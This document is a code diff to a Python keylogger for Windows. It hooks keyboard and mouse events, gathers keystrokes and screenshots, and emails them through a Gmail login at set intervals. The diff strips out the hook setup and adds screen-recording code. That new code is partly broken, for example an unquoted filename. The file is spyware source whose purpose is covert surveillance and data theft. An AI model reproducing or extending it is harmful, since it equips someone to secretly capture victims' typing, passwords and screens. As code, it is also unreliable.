@@ -3,8 +3,22 @@
 
 import socket 
 import sys
+import keyboard
+import os
+import time 
+import random 
+import smtplib
+import string
+import base64
+import win32api
 import pythoncom
-import keyboard,os,time,random,smtplib,string,base64
+import pyautogui
+import numpy
+import cv2
+
+
+
+
 from winreg import *
 
 global t,start_time,pics_names,yourgmail,yourgmailpass,sendto,interval
@@ -77,6 +91,7 @@ def Mail_it(data, pics_names):
         server.login(yourgmail, yourgmailpass)
         server.close()
 
+#screenshot section
 
         def OnMouseEvent(event):
             global yourgmail, yourgmailpass, sendto, interval
@@ -101,18 +116,16 @@ def Mail_it(data, pics_names):
             if int(time.time() - start_time) == int(interval):
                 Mail_it(t, pics_names)  
                 t = ''
-            return True
+            return()
 
-hook = keyboard.HookManager()
+#screen recording section
+            
+resolution = (1920, 1080)
 
-hook.KeyDown = OnKeyboardEvent
+codec = cv2.VideoWriter_fourcc(*"XVID")
 
-hook.MouseAllButtonsDown = OnMouseEvent
+filename = Recording.avi
 
-hook.HookKeyboard()
+fps = 30
 
-hook.HookMouse()
-
-start_time = time.time()
-
-pythoncom.PumpMessages()
+out = cv2.VideoWriter(filename, codec, fps, resolution)
